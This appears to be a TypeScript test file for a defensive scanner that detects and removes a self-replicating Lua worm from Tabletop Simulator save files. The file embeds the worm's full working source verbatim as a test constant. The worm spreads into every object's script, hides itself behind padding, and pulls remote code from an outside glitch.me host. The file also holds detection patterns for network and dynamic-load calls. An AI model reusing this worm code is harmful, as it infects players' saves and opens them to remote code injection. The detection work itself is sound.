/**
 * Node smoke test for the pure analysis engine (run: npx tsx tools/analyzer.test.ts).
 * Uses the real worm source to verify detection, cleansing, and save walking.
 */
import { parseSave, runPatterns, analyzeParsedSave, cleanseSave, cleanseScript, TtsParseError } from '../src/app/core/analyzer';
import { THREAT_PATTERNS, patternById } from '../src/app/core/threat-patterns';
import { highlightLua } from '../src/app/core/lua-highlight';
import { buildPromptForGroup } from '../src/app/core/prompt-builder';
import { resolveGroup } from '../src/app/core/resolution';

// The actual worm, verbatim (the only backslash sequence in it is the Lua "\n\n").
const WORM =
  '--[[Object base code]]Wait.time(function()for a,b in ipairs(getObjects())do if b.getLuaScript():find("tcejbo gninwapS")==nil then b.setLuaScript(b.getLuaScript():gsub(\'%s+$\',\'\')..string.rep(" ",100)..self.getLuaScript():sub(self.getLuaScript():find("--[[Object base code]]",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1).."\\n\\n")end end end,1)if onObjectSpawn==nil then function onObjectSpawn(b)if b.getLuaScript():find("tcejbo gninwapS")==nil then b.setLuaScript(b.getLuaScript():gsub(\'%s+$\',\'\')..string.rep(" ",100)..self.getLuaScript():sub(self.getLuaScript():find("--[[Object base code]]",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1).."\\n\\n")end end end;if onPlayerAction==nil and self.getLuaScript():reverse():find("ereh edoc resU --",1,true)~=nil then self.drag_selectable=true;function onPlayerAction(c,d,e)if self.getLuaScript():reverse():find("ereh edoc resU --",1,true)~=nil and d==Player.Action.Select and#c.getSelectedObjects()==0 then for a,f in ipairs(e)do if f.getGUID()==self.getGUID()then self.setLuaScript(self.getLuaScript():gsub(self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+2,#self.getLuaScript()-self.getLuaScript():reverse():find("ereh edoc resU")+1):gsub("[%(%)%.%%%+%-%*%?%[%]%^%$]","%%%0"),""))end end end end end;WebRequest.get("https://obje.glitch.me/",function(g)if g.is_error then log(g.error)elseif g.text~=""and g.text:sub(1,4)=="true"and self.getLuaScript():find(g.text:sub(5,#g.text),1,true)==nil then self.setLuaScript(self.getLuaScript():sub(0,#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1)..g.text:sub(5,#g.text)..self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+2),#self.getLuaScript())self.reload()end end)--[[Spawning object]]';

const USER_CODE = 'function onLoad()\n  print("hello from Fireball")\nend';
// How the worm actually grafts itself onto a victim: trailing ws stripped, 100 spaces, payload, \n\n
const INFECTED_WITH_USER_CODE = USER_CODE + ' '.repeat(100) + WORM + '\n\n';
const INFECTED_PURE = WORM + '\n\n';

let failures = 0;
function check(name: string, cond: boolean, extra?: string) {
  if (cond) console.log(`  ok  ${name}`);
  else {
    failures++;
    console.error(`FAIL  ${name}${extra ? ' — ' + extra : ''}`);
  }
}

// ── worm pattern ──────────────────────────────────────────────────
const worm = patternById('worm-object-base-code')!;

const detPure = worm.detect(INFECTED_PURE);
check('detects pure worm', !!detPure);
check('pure worm: no extra code', detPure?.extraCodeOutsidePayload === false);
check('pure worm cleanses to empty', worm.cleanse!(INFECTED_PURE) === '');

const detMixed = worm.detect(INFECTED_WITH_USER_CODE);
check('detects worm with user code', !!detMixed);
check('mixed: extra code flagged', detMixed?.extraCodeOutsidePayload === true);
check('cleanse preserves exactly the user code', worm.cleanse!(INFECTED_WITH_USER_CODE) === USER_CODE,
  JSON.stringify(worm.cleanse!(INFECTED_WITH_USER_CODE)?.slice(0, 80)));

// user code BEFORE and AFTER payload
const sandwich = 'print("before")' + ' '.repeat(100) + WORM + '\n\nprint("after")';
check('cleanse keeps code on both sides', worm.cleanse!(sandwich) === 'print("before")\n\nprint("after")');

// stacked double payload (worm re-grafted) — span covers first open → last close
const doubled = USER_CODE + ' '.repeat(100) + WORM + ' '.repeat(100) + WORM + '\n\n';
check('stacked payloads removed in one cleanse', worm.cleanse!(doubled) === USER_CODE);

check('clean script not flagged', worm.detect(USER_CODE) === null);

// ── suppression: worm internals don't double-report ──────────────
const hitsPure = runPatterns(INFECTED_PURE);
check('pure worm yields exactly 1 finding', hitsPure.length === 1, hitsPure.map(h => h.pattern.id).join(','));

const userWithWebRequest = 'WebRequest.get("https://example.com", function() end)' + ' '.repeat(100) + WORM + '\n\n';
const hitsWeb = runPatterns(userWithWebRequest);
check('residual WebRequest still reported after cleanse',
  hitsWeb.some(h => h.pattern.id === 'webrequest-usage') && hitsWeb.some(h => h.pattern.id === 'worm-object-base-code'));

// ── fragment / other detectors ────────────────────────────────────
check('fragment detected', runPatterns('x = "tcejbo gninwapS"').some(h => h.pattern.id === 'worm-fragment'));
check('onUpdate is info', runPatterns('function onUpdate()\nend').some(h => h.pattern.id === 'on-update-handler'));
check('onLoad does not trip dynamic-load', runPatterns('function onLoad() end').length === 0);
check('loadstring trips dynamic-load', runPatterns('loadstring("print(1)")()').some(h => h.pattern.id === 'dynamic-code-load'));

// ── save walking, paths, cleansing the whole save ─────────────────
const save = {
  SaveName: 'Test Table',
  LuaScript: INFECTED_PURE,
  ObjectStates: [
    {
      Name: 'Bag', Nickname: "Player Red's Stuff", GUID: 'aaa111', LuaScript: '',
      ContainedObjects: [
        {
          Name: 'DeckCustom', Nickname: 'Spells', GUID: 'bbb222',
          ContainedObjects: [
            { Name: 'CardCustom', Nickname: 'Fireball', GUID: 'ccc333', LuaScript: INFECTED_WITH_USER_CODE },
          ],
        },
      ],
    },
    { Name: 'Custom_Model', Nickname: '', GUID: 'ddd444', LuaScript: 'function onUpdate() end' },
    {
      Name: 'Custom_Token', Nickname: 'Switcher', GUID: 'eee555', LuaScript: '',
      States: { '2': { Name: 'Custom_Token', Nickname: 'Alt face', GUID: 'fff666', LuaScript: INFECTED_PURE } },
    },
  ],
};

const parsed = parseSave(JSON.stringify(save));
check('total objects counted (bag, deck, card, model, token, state)', parsed.totalObjects === 6, String(parsed.totalObjects));
check('4 scripted nodes (global + card + model + state)', parsed.nodes.length === 4, String(parsed.nodes.length));

const card = parsed.nodes.find(n => n.guid === 'ccc333')!;
check('nested path recorded',
  card.pathSegments.join(' › ') === 'Bag "Player Red\'s Stuff" › DeckCustom "Spells" › CardCustom "Fireball"',
  card.pathSegments.join(' › '));
const stateNode = parsed.nodes.find(n => n.guid === 'fff666')!;
check('state path recorded', stateNode.pathSegments.join(' › ').includes('State 2'), stateNode.pathSegments.join(' › '));

async function main() {
const result = await analyzeParsedSave(parsed, 'test.json', 1000, new Set(), () => {});
check('3 infected objects', result.infectedObjects === 3, String(result.infectedObjects));

// ── aggregation: identical scripts collapse into one group ────────
// INFECTED_PURE is on the Global script AND the state node → 1 group, 2 objects.
const pureGroup = result.groups.find(g => g.severity === 'critical' && !g.extraCodeOutsidePayload)!;
check('identical worm scripts aggregated into one group', pureGroup.occurrences.length === 2,
  String(pureGroup.occurrences.length));
check('aggregated group lists both object paths',
  pureGroup.occurrences.some(o => o.pathSegments.includes('Global script')) &&
  pureGroup.occurrences.some(o => o.pathSegments.join(' ').includes('State 2')));
// 3 distinct scripts total: pure-worm, worm+usercode, onUpdate
check('three unique-script groups', result.groups.length === 3, String(result.groups.length));
check('worm+extra group flagged once',
  result.groups.filter(g => g.extraCodeOutsidePayload).length === 1);
check('groups sorted critical-first', result.groups[0].severity === 'critical');

const outcome = cleanseSave(parsed);
check('3 objects cleansed (2 pure + 1 mixed)', outcome.cleansedCount === 3, String(outcome.cleansedCount));
check('1 extra-code path', outcome.extraCodePaths.length === 1);
check('cleaned JSON has no worm markers', !outcome.json.includes('--[[Object base code]]') && !outcome.json.includes('Spawning object]]'));
const reparsed = JSON.parse(outcome.json);
check('user code survived in cleaned save',
  reparsed.ObjectStates[0].ContainedObjects[0].ContainedObjects[0].LuaScript === USER_CODE);
// after cleansing, only the (non-worm) onUpdate info note may remain
const rescanned = await analyzeParsedSave(parseSave(outcome.json), 't', 1, new Set(), () => {});
check('cleaned save re-scans worm-free', rescanned.groups.every(g => g.severity === 'info'),
  rescanned.groups.map(g => g.findings[0].patternId).join(','));

// ── cleanse preserves the ORIGINAL node.script (for the modal viewer) ──
const cardNode = parsed.nodes.find(n => n.guid === 'ccc333')!;
check('node.script keeps the infected original after cleanse',
  cardNode.script.includes('--[[Object base code]]'));
check('holder LuaScript holds the cleaned code after cleanse',
  cardNode.holder['LuaScript'] === USER_CODE);

// ── worm+extra approval state ─────────────────────────────────────
const extraGroup0 = result.groups.find(g => g.extraCodeOutsidePayload)!;
check('worm+extra group has a cleansed-leftover hash', !!extraGroup0.cleansedScriptHash);
check('worm+extra not approved by default', extraGroup0.approvedExtra === false);
const approvedScan = await analyzeParsedSave(parseSave(JSON.stringify(save)), 't', 1,
  new Set([extraGroup0.cleansedScriptHash!]), () => {});
check('trusting the leftover hash pre-approves the worm+extra group',
  approvedScan.groups.find(g => g.scriptHash === extraGroup0.scriptHash)?.approvedExtra === true);
check('pure worm group has no leftover hash (nothing remains)',
  pureGroup.cleansedScriptHash === undefined);

// ── trusted hash suppresses non-critical, never critical ──────────
const onUpdateGroup = result.groups.find(g => g.severity === 'info')!;
const trustedScan = await analyzeParsedSave(parseSave(JSON.stringify(save)), 't', 1,
  new Set([onUpdateGroup.scriptHash]), () => {});
check('trusted info group marked trusted',
  trustedScan.groups.find(g => g.scriptHash === onUpdateGroup.scriptHash)?.trusted === true);
const trustedWorm = await analyzeParsedSave(parseSave(JSON.stringify(save)), 't', 1,
  new Set([pureGroup.scriptHash]), () => {});
check('trusting a worm hash is ignored (critical never trusted)',
  trustedWorm.groups.find(g => g.scriptHash === pureGroup.scriptHash)?.trusted === false);

// ── cleanseScript (used by the viewer's Cleansed tab) ─────────────
check('cleanseScript strips worm, keeps user code', cleanseScript(INFECTED_WITH_USER_CODE) === USER_CODE);
check('cleanseScript empties a pure worm', cleanseScript(INFECTED_PURE) === '');

// ── Lua highlighter + malicious spans ─────────────────────────────
const wormPattern = patternById('worm-object-base-code')!;
const spans = wormPattern.maliciousSpans!(INFECTED_WITH_USER_CODE);
check('worm maliciousSpans covers the payload', spans.length === 1 && spans[0].start > 0);
const html = highlightLua(INFECTED_WITH_USER_CODE, spans);
check('highlighter marks payload with lua-mal', html.includes('lua-mal'));
check('highlighter HTML-escapes content', !html.includes('<script') && html.includes('lua-keyword'));
check('highlighter on clean code has no lua-mal', !highlightLua(USER_CODE).includes('lua-mal'));
check('highlighter colours keywords', highlightLua('local x = 1').includes('lua-keyword'));
check('highlighter colours strings', highlightLua('local s = "hi"').includes('lua-string'));

// ── tailored AI prompts ───────────────────────────────────────────
const STYLE = 'at most 10'; // marker from the shared plain-language style rules

// pure worm (Infected): embeds the worm script, explains it, short plain answer
const purePrompt = buildPromptForGroup(pureGroup, INFECTED_PURE, { kind: 'worm' });
check('worm prompt names the threat', purePrompt.includes('Self-replicating Lua worm'));
check('worm prompt embeds the script', purePrompt.includes('--[[Object base code]]'));
check('every prompt enforces short, plain answer', purePrompt.includes(STYLE) && purePrompt.includes('non-technical'));

// worm + extra (Verification needed): embeds the LEFTOVER and asks if it's dangerous
const extraGroup = result.groups.find(g => g.extraCodeOutsidePayload)!;
const extraPrompt = buildPromptForGroup(extraGroup, INFECTED_WITH_USER_CODE, { kind: 'leftover' });
check('worm+extra prompt embeds leftover user code', extraPrompt.includes(USER_CODE));
check('worm+extra prompt omits the removed worm', !extraPrompt.includes('--[[Object base code]]'));
check('worm+extra prompt asks about danger', /dangerous|suspicious/i.test(extraPrompt));
check('worm+extra labels the leftover code', extraPrompt.includes('REMAINING AFTER'));

// network finding: prompt talks about internet connections
const webScript = 'function onLoad()\n  WebRequest.get("https://example.com/stats", function(r) end)\nend';
const webSave = { ObjectStates: [{ Name: 'Custom_Token', Nickname: 'Uploader', GUID: 'w1', LuaScript: webScript }] };
const webParsed = parseSave(JSON.stringify(webSave));
const webResult = await analyzeParsedSave(webParsed, 'w', 1, new Set(), () => {});
const webGroup = webResult.groups.find(g => g.findings.some(f => f.patternId === 'webrequest-usage'))!;
const webPrompt = buildPromptForGroup(webGroup, webScript, { kind: 'pattern', patternId: 'webrequest-usage' });
check('network prompt mentions the internet', /internet|web address/i.test(webPrompt));
check('network prompt embeds its url', webPrompt.includes('example.com/stats'));

// ── state-tailored prompt + resolution focus ──────────────────────
// Build a worm+leftover-with-WebRequest group and walk its states.
const mixedScript = 'function onLoad()\n  WebRequest.get("https://track.example/x", function(r) end)\nend' +
  ' '.repeat(100) + WORM + '\n\n';
const mixedSave = { ObjectStates: [{ Name: 'Custom_Token', Nickname: 'Mixed', GUID: 'm1', LuaScript: mixedScript }] };
const mixedParsed = parseSave(JSON.stringify(mixedSave));
const mixedResult = await analyzeParsedSave(mixedParsed, 'm', 1, new Set(), () => {});
const mixedGroup = mixedResult.groups[0];
check('mixed group has worm + webrequest findings',
  mixedGroup.findings.some(f => f.patternId === 'worm-object-base-code') &&
  mixedGroup.findings.some(f => f.patternId === 'webrequest-usage'));

// Infected → worm prompt; no prompt once Healed; dangerous-methods focus after worm handled
const rInfected = resolveGroup(mixedGroup, { cleansed: false, dismissed: false });
check('infected state → worm focus', rInfected.prompt?.kind === 'worm' && rInfected.label === 'Infected');
const rVerify = resolveGroup(mixedGroup, { cleansed: true, dismissed: false });
check('cleansed+extra → leftover focus, Verification needed',
  rVerify.prompt?.kind === 'leftover' && rVerify.label === 'Verification needed');
const approvedMixed = { ...mixedGroup, approvedExtra: true };
const rDangerous = resolveGroup(approvedMixed, { cleansed: true, dismissed: false });
check('after approving leftover, residual WebRequest surfaces as Dangerous methods',
  rDangerous.label === 'Dangerous methods' &&
  rDangerous.prompt?.kind === 'pattern' && rDangerous.prompt.patternId === 'webrequest-usage');
const rHealed = resolveGroup(approvedMixed, { cleansed: true, dismissed: true });
check('dismissing residual → Healed with no prompt', rHealed.label === 'Healed' && rHealed.prompt === null);

// the dangerous-methods prompt asks about the network call, not the worm
const dangerPrompt = buildPromptForGroup(approvedMixed, mixedScript, rDangerous.prompt!);
check('dangerous-methods prompt focuses on the network call',
  /internet|web address/i.test(dangerPrompt) && dangerPrompt.includes('track.example'));
check('dangerous-methods prompt does NOT re-embed the removed worm',
  !dangerPrompt.includes('--[[Object base code]]') && dangerPrompt.includes('REMAINING AFTER'));
// sanity: a standalone (non-worm) dangerous script still embeds its full script as-is
const webPrompt2 = buildPromptForGroup(webGroup, webScript, { kind: 'pattern', patternId: 'webrequest-usage' });
check('non-worm dangerous prompt labels it SCRIPT (no worm to remove)',
  webPrompt2.includes('SCRIPT START') && !webPrompt2.includes('REMAINING AFTER'));

// ── error handling ────────────────────────────────────────────────
const throws = (fn: () => void) => { try { fn(); return null; } catch (e) { return e; } };
check('empty input → TtsParseError', throws(() => parseSave('   ')) instanceof TtsParseError);
check('invalid JSON → TtsParseError', throws(() => parseSave('{nope')) instanceof TtsParseError);
check('non-TTS JSON → TtsParseError', throws(() => parseSave('{"hello":"world"}')) instanceof TtsParseError);
check('JSON array → TtsParseError', throws(() => parseSave('[1,2,3]')) instanceof TtsParseError);

console.log(`\n${failures === 0 ? 'ALL PASS' : failures + ' FAILURE(S)'} — ${THREAT_PATTERNS.length} patterns registered`);
process.exit(failures === 0 ? 0 : 1);
}
void main();
